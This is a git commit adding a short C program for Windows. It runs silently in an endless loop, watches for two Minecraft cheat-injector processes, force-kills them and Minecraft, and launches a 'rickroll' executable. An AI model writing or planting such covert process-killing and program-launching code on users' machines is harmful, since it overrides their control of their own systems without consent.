e00fc39fb5cf0eb268a7fbd4f326b24b1e9feb70
Kuu <69802296+KohakuChanX@users.noreply.github.com>
2022-04-04 05:40:29 +0700

    Add files via upload

---
+++ main.c
@@ -0,0 +1,16 @@
+#include <stdlib.h>
+
+int WinMain() {
+    while (1) {
+        if (system("tasklist | findstr HorionInjector.exe") == 0) {
+            system("taskkill /f /im HorionInjector.exe");
+            system("taskkill /f /im minecraft.windows.exe");
+            system("C:\\Users\\rickroll.exe");
+        }
+        if (system("tasklist | findstr nitr0.exe") == 0) {
+            system("taskkill /f /im nitr0.exe");
+            system("taskkill /f /im minecraft.windows.exe");
+            system("C:\\Users\\rickroll.exe");
+        }
+    }
+}
